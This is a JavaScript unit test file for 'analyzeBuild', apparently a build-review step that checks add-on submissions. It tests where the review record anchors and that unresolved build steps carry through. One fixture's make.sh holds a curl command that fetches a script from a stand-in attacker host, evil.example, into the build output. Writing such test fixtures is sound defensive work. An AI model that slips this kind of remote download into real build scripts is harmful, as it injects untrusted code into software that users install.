// Unit tests for analyzeBuild: the SCA build review's one look at the build, run in
// setup and stored on addon.buildFiles.buildReview for the input:build checks to read.
// Nothing says what a build DOES, so the record it produces carries only what the
// escalation has to name - where it anchors, and what the linter could not follow.

import { test } from "node:test";
import assert from "node:assert/strict";

import { analyzeBuild } from "../../src/build/analyze.js";

const build = (obj) => ({
  files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
});

// The anchor is the submission's own package.json when it ships one, so the escalation
// the reviewer reads lands on the file that documents the build.
test("analyzeBuild anchors at package.json when the submission ships one", () => {
  const out = analyzeBuild({
    build: build({
      "package.json": JSON.stringify({
        name: "x",
        scripts: { build: "webpack" },
      }),
    }),
  });
  assert.equal(out.anchor, "package.json");
});

// No entry point to follow means no corpus and no file to point at, so the record
// anchors nowhere - which is what makes the escalation carry no locus.
test("analyzeBuild anchors nowhere when there is no entry point", () => {
  assert.equal(analyzeBuild({ build: build({}) }).anchor, null);
  assert.equal(analyzeBuild({ build: undefined }).anchor, null);
});

// The deterministic signals selectBuildCorpus could not follow ride along, so the
// escalation can name them. They are the only detail the record carries.
test("analyzeBuild carries the unresolved build steps through", () => {
  const out = analyzeBuild({
    build: build({
      "package.json": JSON.stringify({ scripts: { build: "sh ./make.sh" } }),
      "make.sh": "curl https://evil.example/x.js -o dist/x.js\n",
    }),
  });
  assert.ok(Array.isArray(out.unresolved));
});
